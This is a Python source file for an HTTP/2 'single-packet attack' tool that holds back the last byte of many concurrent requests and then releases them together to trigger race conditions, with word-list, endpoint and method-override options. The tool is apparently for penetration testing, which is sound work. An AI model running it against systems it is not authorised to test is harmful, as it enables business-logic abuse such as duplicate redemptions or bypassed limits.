from rich.console import Console
import argparse
import logging

import utils

import socket
import ssl
import scapy.contrib.http2 as h2
from scapy.packet import NoPayload
import gzip
import zlib
import brotli

import time
import pickle


class H2SinglePacketAttacker:
    def __init__(self):
        self.console = Console()
        self.args = self.initialize_argparse()
        self.logger = logging.getLogger(__name__)
        logging.basicConfig(filename='logs.log', encoding='utf-8', level=logging.DEBUG)

        self.host_name = self.args.host_name
        self.port_number = self.args.port_number

        self.tls_channel = self.args.tls_channel
        self.streams = self.args.streams
        self.reading_response_timeout = self.args.reading_response_timeout

        self.scheme = self.args.scheme
        self.method = self.args.method
        self.path = self.args.path
        self.headers = self.args.header if self.args.header else []
        self.data = self.args.data
        self.variable_data_key = self.args.variable_data_key
        self.word_list = self.args.word_list
        self.word_list_items = []

        self.multiple_endpoint_mode = self.args.multiple_endpoint_mode
        self.get_mode = self.args.get_mode
        self.override_method = self.args.override_method
        self.display_mode = self.args.display_mode

        self.streams_and_associate_data = {}
        self.pickle = self.args.pickle

        self.socket = None
        self.hpack_header_table = h2.HPackHdrTable()
        self.response = b''

        self.h2_preface = bytes.fromhex('505249202a20485454502f322e300d0a0d0a534d0d0a0d0a')

        self.settings_frame = {
            'SETTINGS_HEADER_TABLE_SIZE': {
                'id': 1,
                'value': 4096
            },
            'SETTINGS_ENABLE_PUSH': {
                'id': 2,
                'value': 0
            },
            'SETTINGS_MAX_CONCURRENT_STREAMS': {
                'id': 3,
                'value': 100
            },
            'SETTINGS_INITIAL_WINDOW_SIZE': {
                'id': 4,
                'value': 65535
            },
            'SETTINGS_MAX_FRAME_SIZE': {
                'id': 5,
                'value': 16384
            },
            'SETTINGS_MAX_HEADER_LIST_SIZE': {
                'id': 6,
                'value': None
            }
        }

        self.settings = {
            1: 'SETTINGS_HEADER_TABLE_SIZE',
            2: 'SETTINGS_ENABLE_PUSH',
            3: 'SETTINGS_MAX_CONCURRENT_STREAMS',
            4: 'SETTINGS_INITIAL_WINDOW_SIZE',
            5: 'SETTINGS_MAX_FRAME_SIZE',
            6: 'SETTINGS_MAX_HEADER_LIST_SIZE'
        }

    def initialize_argparse(self):
        utils.cprint(self, 'Initializing argparse...', 'ack')

        parser = argparse.ArgumentParser(description='Tool to send HTTP/2 requests in a single packet, useful for testing race condition attacks.', epilog='Coded by Mohamed Ahmed (ma4747gh).')

        parser.add_argument('host_name', help='The hostname of the server.')
        parser.add_argument('port_number', type=int, help='The port number to connect to.')

        parser.add_argument('--tls_channel', action='store_true', help='Enable TLS for the connection.')
        parser.add_argument('--streams', type=int, default=4, help='Number of streams to use (default: 4).')
        parser.add_argument('--reading_response_timeout', type=int, default=4, help='Response reading timeout in seconds (default: 4).')

        parser.add_argument('--scheme', choices=['http', 'https'], help='Specify the URL scheme (http or https).')
        parser.add_argument('--method', action='append', choices=['GET', 'POST'], help='HTTP method to use (default: GET).')
        parser.add_argument('--path', action='append', help='The path to request (default: /).')
        parser.add_argument('--header', action='append', help='Add headers to the request. Can be used multiple times.')
        parser.add_argument('--data', action='append', help='Data to include in the request body.')
        parser.add_argument('--variable_data_key', help='Key in the request data to be replaced with items from the word list.')
        parser.add_argument('--word_list', help='Path to a file containing words to be used in place of the variable data key.')

        parser.add_argument('--multiple_endpoint_mode', action='store_true', help='Enable mode to send requests to multiple endpoints.')
        parser.add_argument('--get_mode', type=int, choices=[0, 1, 2], default=0, help='Mode for GET requests (0: last byte removal, 1: remove EH flag, 2: use POST with override method header, default: 0).')
        parser.add_argument('--override_method', choices=['x-method-override', 'x-http-method-override'], help='Override method header for GET requests in mode 2.')
        parser.add_argument('--display_mode', type=int, choices=[0, 1], default=0, help='Mode to display responses (default: 0).')

        parser.add_argument('--pickle', help='Path to a pickle file for saving or loading state (declare path without extension).')

        args = parser.parse_args()

        if args.header:
            headers = []
            for header in args.header:
                if header != 'break':
                    headers.append(header.split(': ')[0].lower() + ': ' + header.split(': ')[1])
                else:
                    headers.append(header)
            args.header = headers

        if args.method and len(args.method) == 1 and not args.multiple_endpoint_mode:
            args.method = args.method[0]
        elif not args.method:
            args.method = 'GET'

        if args.path and len(args.path) == 1 and not args.multiple_endpoint_mode:
            args.path = args.path[0]
        elif not args.path:
            args.path = '/'

        if args.data and len(args.data) == 1 and not args.multiple_endpoint_mode:
            args.data = args.data[0]

        if (args.port_number != 80 and args.port_number != 443) and (args.scheme is None):
            utils.cprint(self, 'Please specify the scheme using the --scheme flag.', 'failure')
            exit()

        if args.get_mode == 2 and not args.override_method:
            utils.cprint(self, 'Please specify the override method using the --override_method flag.', 'failure')
            exit()

        if args.get_mode != 2 and args.override_method:
            utils.cprint(self, 'You can\'t use --get_mode 2 without using the --override_method flag.', 'failure')
            exit()

        return args

    def read_word_list_file(self):
        with open(self.word_list) as file:
            for line in file.readlines():
                self.word_list_items.append(line.strip())

    def establish_socket_connection(self):
        utils.cprint(self, 'Establishing socket connection...', 'ack')

        try:
            temp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            temp_socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 0)
            temp_socket.connect((self.host_name, self.port_number))
        except Exception as e:
            self.logger.exception(e)
            utils.cprint(self, 'An exception has occurred. Please check the logs in the logs.log file for more details.', 'failure')
            exit()

        l_ip_address, l_port_number = temp_socket.getsockname()
        r_ip_address, r_port_number = temp_socket.getpeername()
        utils.cprint(self, 'Socket connection has been established from \'{}:{}\' to \'{}:{}\'.'.format(l_ip_address, l_port_number, r_ip_address, r_port_number), 'info')

        self.socket = temp_socket

    def establish_tls_connection(self):
        utils.cprint(self, 'Establishing TLS connection...', 'ack')

        ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
        ssl_context.set_alpn_protocols(['h2'])

        try:
            ssl_socket = ssl_context.wrap_socket(self.socket, server_hostname=self.host_name)
        except Exception as e:
            self.logger.exception(e)
            utils.cprint(self, 'An exception has occurred. Please check the logs in the logs.log file for more details.', 'failure')
            exit()

        utils.cprint(self, 'TLS connection has been established.', 'info')

        self.socket = ssl_socket

    def send_h2_connection_preface(self):
        utils.cprint(self, 'Sending HTTP/2 connection preface...', 'ack')

        try:
            self.socket.send(self.h2_preface)
        except Exception as e:
            self.logger.exception(e)
            utils.cprint(self, 'An exception has occurred. Please check the logs in the logs.log file for more details.', 'failure')
            exit()

    @staticmethod
    def create_settings_frame(settings):
        return h2.H2Frame() / h2.H2SettingsFrame(settings=settings)

    def send_settings_frame(self):
        utils.cprint(self, 'Sending settings frame...', 'ack')

        settings = []
        for setting_name, setting_data in self.settings_frame.items():
            if setting_data['value'] is None:
                continue
            temp_setting = h2.H2Setting(id=setting_data['id'], value=setting_data['value'])
            settings.append(temp_setting)

        settings_frame = self.create_settings_frame(settings)
        try:
            self.socket.send(bytes(settings_frame))
        except Exception as e:
            self.logger.exception(e)
            utils.cprint(self, 'An exception has occurred. Please check the logs in the logs.log file for more details.', 'failure')
            exit()

    def create_post_request_frames(self, stream_id):
        if not self.multiple_endpoint_mode:
            data = None
            if self.data:
                data = bytes(self.data, 'utf-8')
                if self.variable_data_key:
                    data = data.replace(self.variable_data_key.encode(), self.word_list_items.pop(0).encode())
                    self.streams_and_associate_data[stream_id] = {}
                    self.streams_and_associate_data[stream_id]['request_data'] = data

            if self.port_number == 80:
                scheme = 'http'
            elif self.port_number == 443:
                scheme = 'https'
            else:
                scheme = self.scheme
            request_line = f':method {self.method}\n:path {self.path}\n:scheme {scheme}\n:authority {self.host_name}\n'

            all_headers = request_line + '\n'.join(self.headers)

            frames = h2.HPackHdrTable().parse_txt_hdrs(bytes(all_headers, 'utf-8'), stream_id=stream_id, body=data)

            return frames
        else:
            data = None
            if self.data:
                data = bytes(self.data.pop(0), 'utf-8')

            if self.port_number == 80:
                scheme = 'http'
            elif self.port_number == 443:
                scheme = 'https'
            else:
                scheme = self.scheme
            request_line = f':method {self.method.pop(0)}\n:path {self.path.pop(0)}\n:scheme {scheme}\n:authority {self.host_name}\n'

            headers = []
            for header in self.headers:
                if header != 'break':
                    headers.append(header)
                else:
                    break
            self.headers = self.headers[len(headers)+1:]

            all_headers = request_line + '\n'.join(headers)

            frames = h2.HPackHdrTable().parse_txt_hdrs(bytes(all_headers, 'utf-8'), stream_id=stream_id, body=data)

            return frames

    def create_get_request_frames(self, stream_id):
        if not self.multiple_endpoint_mode:
            if self.port_number == 80:
                scheme = 'http'
            elif self.port_number == 443:
                scheme = 'https'
            else:
                scheme = self.scheme

            if self.get_mode != 2:
                request_line = f':method {self.method}\n:path {self.path}\n:scheme {scheme}\n:authority {self.host_name}\n'
            else:
                request_line = f':method POST\n:path {self.path}\n:scheme {scheme}\n:authority {self.host_name}\n'

            if self.get_mode == 0:
                all_headers = request_line + '\n'.join(self.headers) + '\ncontent-length: 1\n'
            elif self.get_mode == 1:
                all_headers = request_line + '\n'.join(self.headers)
            else:
                all_headers = request_line + '\n'.join(self.headers) + '\n{}: GET\n'.format(self.override_method)

            frames = h2.HPackHdrTable().parse_txt_hdrs(bytes(all_headers, 'utf-8'), stream_id=stream_id)

            return frames
        else:
            if self.port_number == 80:
                scheme = 'http'
            elif self.port_number == 443:
                scheme = 'https'
            else:
                scheme = self.scheme

            if self.get_mode != 2:
                request_line = f':method {self.method.pop(0)}\n:path {self.path.pop(0)}\n:scheme {scheme}\n:authority {self.host_name}\n'
            else:
                request_line = f':method POST\n:path {self.path.pop(0)}\n:scheme {scheme}\n:authority {self.host_name}\n'

            headers = []
            for header in self.headers:
                if header != 'break':
                    headers.append(header)
                else:
                    break
            self.headers = self.headers[len(headers) + 1:]

            if self.get_mode == 0:
                all_headers = request_line + '\n'.join(headers) + '\ncontent-length: 1\n'
            elif self.get_mode == 1:
                all_headers = request_line + '\n'.join(headers)
            else:
                all_headers = request_line + '\n'.join(headers) + '\n{}: GET\n'.format(self.override_method)

            frames = h2.HPackHdrTable().parse_txt_hdrs(bytes(all_headers, 'utf-8'), stream_id=stream_id)

            return frames

    def prepare_frames(self):
        headers_and_data_frames = []
        last_byte_frames = []

        stream_id = 1
        if self.multiple_endpoint_mode:
            methods = []
            for method in self.method:
                methods.append(method)

        for _ in range(self.streams):
            if not self.multiple_endpoint_mode:
                if self.method == 'POST':
                    post_request_frames = self.create_post_request_frames(stream_id)

                    last_byte = post_request_frames.frames[-1].data[-1:]
                    last_byte_data_frame = h2.H2Frame(stream_id=stream_id, flags={'ES'}) / h2.H2DataFrame(data=last_byte)

                    post_request_frames.frames[-1].data = post_request_frames.frames[-1].data[:-1]
                    post_request_frames.frames[-1].flags.remove('ES')

                    headers_and_data_frames.append(post_request_frames)
                    last_byte_frames.append(last_byte_data_frame)

                    stream_id += 2
                elif self.method == 'GET':
                    get_request_frames = self.create_get_request_frames(stream_id)

                    if self.get_mode == 0 or self.get_mode == 2:
                        get_request_frames.frames[0].flags.remove('ES')
                    else:
                        get_request_frames.frames[0].flags.remove('EH')

                    if self.get_mode == 0 or self.get_mode == 2:
                        last_byte_data_frame = h2.H2Frame(stream_id=stream_id, flags={'ES'}) / h2.H2DataFrame(data=b'A')
                    else:
                        last_byte_data_frame = h2.H2Frame(stream_id=stream_id, flags={'EH'}) / h2.H2ContinuationFrame()

                    headers_and_data_frames.append(get_request_frames)
                    last_byte_frames.append(last_byte_data_frame)

                    stream_id += 2
            else:
                method = methods.pop(0)
                if method == 'POST':
                    post_request_frames = self.create_post_request_frames(stream_id)

                    if len(post_request_frames.frames) == 1:
                        post_request_frames.frames[0].flags.remove('EH')

                        last_byte_data_frame = h2.H2Frame(stream_id=stream_id,
                                                          flags={'EH'}) / h2.H2ContinuationFrame()

                        headers_and_data_frames.append(post_request_frames)
                        last_byte_frames.append(last_byte_data_frame)
                    else:
                        last_byte = post_request_frames.frames[-1].data[-1:]
                        last_byte_data_frame = h2.H2Frame(stream_id=stream_id, flags={'ES'}) / h2.H2DataFrame(
                            data=last_byte)

                        post_request_frames.frames[-1].data = post_request_frames.frames[-1].data[:-1]
                        post_request_frames.frames[-1].flags.remove('ES')

                        headers_and_data_frames.append(post_request_frames)
                        last_byte_frames.append(last_byte_data_frame)

                    stream_id += 2
                elif method == 'GET':
                    get_request_frames = self.create_get_request_frames(stream_id)

                    if self.get_mode == 0 or self.get_mode == 2:
                        get_request_frames.frames[0].flags.remove('ES')
                    else:
                        get_request_frames.frames[0].flags.remove('EH')

                    if self.get_mode == 0 or self.get_mode == 2:
                        last_byte_data_frame = h2.H2Frame(stream_id=stream_id, flags={'ES'}) / h2.H2DataFrame(
                            data=b'A')
                    else:
                        last_byte_data_frame = h2.H2Frame(stream_id=stream_id,
                                                          flags={'EH'}) / h2.H2ContinuationFrame()

                    headers_and_data_frames.append(get_request_frames)
                    last_byte_frames.append(last_byte_data_frame)

                    stream_id += 2

        return headers_and_data_frames, last_byte_frames

    def send_ping_frame(self):
        utils.cprint(self, 'Sending ping frame...', 'ack')

        try:
            ping_frame = h2.H2Frame() / h2.H2PingFrame('ma4747gh')
            self.socket.send(bytes(ping_frame))
        except Exception as e:
            self.logger.exception(e)
            utils.cprint(self, 'An exception has occurred. Please check the logs in the logs.log file for more details.', 'failure')
            exit()

    def send_frames(self):
        headers_and_data_frames, last_byte_frames = self.prepare_frames()

        temp_headers_and_data_frames = b''
        for item in headers_and_data_frames:
            temp_headers_and_data_frames += bytes(item)

        temp_last_byte_frames = b''
        for item in last_byte_frames:
            temp_last_byte_frames += bytes(item)

        try:
            utils.cprint(self, 'Sending HEADERS and DATA frames without the last byte...', 'ack')
            self.socket.send(temp_headers_and_data_frames)

            time.sleep(0.1)
            self.send_ping_frame()

            utils.cprint(self, 'Sending the last byte frame...', 'ack')
            self.socket.send(temp_last_byte_frames)
        except Exception as e:
            self.logger.exception(e)
            utils.cprint(self, 'An exception has occurred. Please check the logs in the logs.log file for more details.', 'failure')
            exit()

    def read_response_from_socket(self):
        utils.cprint(self, 'Reading the response from the socket...', 'ack')

        self.socket.settimeout(self.reading_response_timeout)

        response = b''
        while True:
            try:
                data = self.socket.recv(4096)
                if not data:
                    break
            except socket.timeout:
                break
            response += data

        self.response = response

    @staticmethod
    def parse_data_frame(frame):
        return frame.stream_id, frame.data

    def parse_headers_frame(self, frame):
        return frame.stream_id, self.hpack_header_table.gen_txt_repr(frame.hdrs)

    def parse_reset_frame(self, frame):
        utils.cprint(self, 'The host reset the connection for stream id {} with the following error message: \'{}\'.'.format(frame.stream_id, frame.error), 'failure')

    def parse_settings_frame(self, frame):
        if 'A' in frame.flags:
            utils.cprint(self, 'The host accepted your SETTINGS frame.', 'success')
        else:
            utils.cprint(self, 'The host didn\'t accept your SETTINGS frame. Below is the host\'s desired SETTINGS frame.', 'info')

            settings = {}
            for setting in frame.settings:
                if setting.id in self.settings:
                    settings[self.settings[setting.id]] = setting.value
            utils.cprint_json(self, settings, False)

            utils.cprint(self, 'Sending your acknowledgement for the received SETTINGS frame to the host.', 'ack')
            self.socket.send(bytes(h2.H2Frame(flags={'A'}) / h2.H2SettingsFrame(settings=[])))

    def parse_ping_frame(self, frame):
        if 'A' in frame.flags:
            utils.cprint(self, 'The host sent an acknowledgement for the ping frame.', 'info')

    def parse_window_update_frame(self, frame):
        utils.cprint(self, 'The host updated the window size to {}.'.format(frame.win_size_incr), 'info')

    def decompress_gzip_data(self, gzip_data):
        try:
            decompressed_content = gzip.decompress(gzip_data)
            decoded_content = decompressed_content.decode()
        except Exception as e:
            self.logger.exception(e)
            utils.cprint(self, 'An exception has occurred. Please check the logs in the logs.log file for more details.', 'failure')
            exit()

        return decoded_content

    def decompress_deflate_data(self, deflate_data):
        try:
            decompressed_content = zlib.decompress(deflate_data, -zlib.MAX_WBITS)
            decoded_content = decompressed_content.decode('utf-8')
        except Exception as e:
            self.logger.exception(e)
            utils.cprint(self, 'An exception has occurred. Please check the logs in the logs.log file for more details.', 'failure')
            exit()

        return decoded_content

    def decompress_br_data(self, br_data):
        try:
            decompressed_content = brotli.decompress(br_data)
            decoded_content = decompressed_content.decode()
        except Exception as e:
            self.logger.exception(e)
            utils.cprint(self, 'An exception has occurred. Please check the logs in the logs.log file for more details.', 'failure')
            exit()

        return decoded_content

    def display_responses_for_requests(self, headers_and_data_frames):
        for stream_id, stream_response in headers_and_data_frames.items():
            response = b''
            response += '[bold green]Response of Stream ID: {}[/bold green]\n\n'.format(stream_id).encode()

            for header in stream_response['headers'].split('\n'):
                if 'content-encoding' in header:
                    if 'content-encoding: gzip' in header:
                        stream_response['data'] = self.decompress_gzip_data(stream_response['data'])
                    elif 'content-encoding: deflate' in header:
                        stream_response['data'] = self.decompress_deflate_data(stream_response['data'])
                    elif 'content-encoding: br' in header:
                        stream_response['data'] = self.decompress_br_data(stream_response['data'])
                try:
                    key, value = header.split(': ')
                    key = '-'.join([word.capitalize() for word in key.split('-')])
                    response += '[blue]{}[/blue]: {}\n'.format(key, value).encode()
                except ValueError:
                    response += 'HTTP/2 {}\n'.format(header.split(' ')[1]).encode()

            if stream_response['data']:
                response += b'\n' + stream_response['data']

            utils.cprint_panel(self, mode=self.display_mode, data=response)

    def parse_response(self):
        utils.cprint(self, 'Parsing the response...', 'ack')

        headers_and_data_frames = {}
        if self.response:
            parsed_frames = h2.H2Seq(self.response).frames

            for frame in parsed_frames:
                if isinstance(frame.payload, h2.H2DataFrame):
                    stream_id, data = self.parse_data_frame(frame)
                    if stream_id not in headers_and_data_frames:
                        headers_and_data_frames[stream_id] = {'headers': '', 'data': data}
                    else:
                        headers_and_data_frames[stream_id]['data'] += data
                elif isinstance(frame.payload, h2.H2HeadersFrame):
                    stream_id, headers = self.parse_headers_frame(frame)
                    if stream_id not in headers_and_data_frames:
                        headers_and_data_frames[stream_id] = {'headers': headers, 'data': b''}
                    else:
                        headers_and_data_frames[stream_id]['headers'] += headers
                elif isinstance(frame.payload, h2.H2ResetFrame):
                    self.parse_reset_frame(frame)
                elif isinstance(frame.payload, h2.H2SettingsFrame):
                    self.parse_settings_frame(frame)
                elif isinstance(frame.payload, h2.H2PingFrame):
                    self.parse_ping_frame(frame)
                elif isinstance(frame.payload, h2.H2WindowUpdateFrame):
                    self.parse_window_update_frame(frame)
                elif isinstance(frame.payload, NoPayload):
                    if frame.type == 4:
                        self.parse_settings_frame(frame)

        self.display_responses_for_requests(headers_and_data_frames)
        if self.pickle:
            with open('{}.pkl'.format(self.pickle), 'wb') as file:
                if self.streams_and_associate_data:
                    for key, value in self.streams_and_associate_data.items():
                        headers_and_data_frames[key].update(value)
                pickle.dump(headers_and_data_frames, file)

    def close_connection(self):
        utils.cprint(self, 'Closing the connection...', 'ack')

        go_away_frame = h2.H2Frame(stream_id=0) / h2.H2GoAwayFrame(last_stream_id=0, error=0)
        try:
            self.socket.send(bytes(go_away_frame))
            self.socket.close()
        except Exception as e:
            self.logger.exception(e)
            utils.cprint(self, 'An exception has occurred. Please check the logs in the logs.log file for more details.', 'failure')
            exit()

    def start(self):
        if self.word_list:
            self.read_word_list_file()
        self.establish_socket_connection()
        if self.tls_channel:
            self.establish_tls_connection()
        self.send_h2_connection_preface()
        self.send_settings_frame()
        self.send_frames()
        self.read_response_from_socket()
        self.parse_response()
        self.close_connection()


h2_single_packet_attacker = H2SinglePacketAttacker()
h2_single_packet_attacker.start()
